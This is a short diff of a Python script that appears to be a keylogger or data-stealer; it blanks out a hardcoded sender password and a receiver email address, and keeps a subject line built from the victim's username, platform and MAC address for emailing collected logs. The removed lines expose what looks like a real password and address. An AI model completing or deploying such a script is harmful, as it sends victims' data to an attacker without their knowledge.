@@ -40,10 +40,10 @@ Log = list()
 
 #sender email and password
 email = ''
-password = '8mustafa8'
+password = ''
 
 #resever email
-resever = 'sajjad.jawad.alkhafaji@mail.ru'
+resever = ''
 
 #setup subject and the message to be sent
 subject = "[{0}] - [{1}] - [{2}]".format(getuser(), sys.platform, MACaddress())
